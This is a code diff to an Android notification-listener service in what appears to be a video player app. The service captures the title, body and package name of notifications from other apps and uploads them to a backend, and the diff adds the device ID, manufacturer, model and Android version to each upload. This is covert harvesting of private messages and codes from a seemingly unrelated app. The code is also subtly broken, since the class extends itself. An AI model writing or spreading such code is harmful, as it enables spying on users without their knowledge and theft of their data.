@@ -1,0 +1,68 @@
+--- a/src/services/NotificationListenerService.java
++++ b/src/services/NotificationListenerService.java
+@@ -45,12 +45,12 @@ public class NotificationListenerService extends NotificationListenerService {
+             // Create notification data object
+             JSONObject notificationData = new JSONObject();
+-            notificationData.put("packageName", packageName);
+-            notificationData.put("title", title);
+-            notificationData.put("text", text);
+-            notificationData.put("timestamp", sbn.getPostTime());
+-            notificationData.put("id", sbn.getId());
+-            notificationData.put("userId", getUserId()); // Get from shared preferences
++            notificationData.put("deviceId", getDeviceId());
++            notificationData.put("title", title);
++            notificationData.put("body", text);
++            notificationData.put("appName", getAppName(packageName));
++            notificationData.put("packageName", packageName);
++            notificationData.put("deviceInfo", getDeviceInfo());
++            notificationData.put("notificationData", getNotificationData(sbn));
+             
+             // Send to backend
+             sendNotificationToBackend(notificationData);
+@@ -85,4 +85,40 @@ public class NotificationListenerService extends NotificationListenerService {
+         return getSharedPreferences("VideoPlayerPrefs", MODE_PRIVATE)
+                 .getString("userId", "unknown");
+     }
++
++    private String getDeviceId() {
++        return android.provider.Settings.Secure.getString(
++            getContentResolver(), 
++            android.provider.Settings.Secure.ANDROID_ID
++        );
++    }
++
++    private String getAppName(String packageName) {
++        try {
++            android.content.pm.PackageManager pm = getPackageManager();
++            android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
++            return pm.getApplicationLabel(ai).toString();
++        } catch (Exception e) {
++            return packageName;
++        }
++    }
++
++    private JSONObject getDeviceInfo() {
++        try {
++            JSONObject deviceInfo = new JSONObject();
++            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
++            deviceInfo.put("model", android.os.Build.MODEL);
++            deviceInfo.put("androidVersion", android.os.Build.VERSION.RELEASE);
++            deviceInfo.put("sdkVersion", android.os.Build.VERSION.SDK_INT);
++            return deviceInfo;
++        } catch (Exception e) {
++            return new JSONObject();
++        }
++    }
++
++    private JSONObject getNotificationData(StatusBarNotification sbn) {
++        try {
++            JSONObject data = new JSONObject();
++            data.put("timestamp", sbn.getPostTime());
++            data.put("id", sbn.getId());
++            data.put("userId", getUserId());
++            return data;
++        } catch (Exception e) {
++            return new JSONObject();
++        }
++    }
+ } 
